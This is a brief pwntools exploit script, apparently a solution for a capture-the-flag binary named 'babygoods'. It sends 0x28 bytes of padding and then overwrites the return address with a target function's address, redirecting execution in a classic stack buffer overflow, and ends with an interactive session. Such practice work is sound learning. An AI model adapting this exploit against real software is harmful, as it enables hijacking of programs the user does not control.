#!/usr/bin/python3
from pwn import*

exe = ELF('./babygoods_patched',checksec=False)
#libc = ELF('./<libc_file>',checksec=False)

context.binary = exe

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg,data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)
sln = lambda msg, num: sla(msg, str(num).encode())
sn = lambda msg, num: sa(msg, str(num).encode())

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        b*buildpram+164         
                   
        c
        ''')
        input()

if args.REMOTE:
    p = remote('')
else:
    p = process(exe.path)
GDB()            

sla(b'name: ',b'hiu')
sla(b'Input: ',b'1')
sla(b'(1-5): ',b'5')

payload = b'a'*0x28
payload += p64(exe.sym.sub_15210123)

sla(b' Give it a name: ',payload)

p.interactive()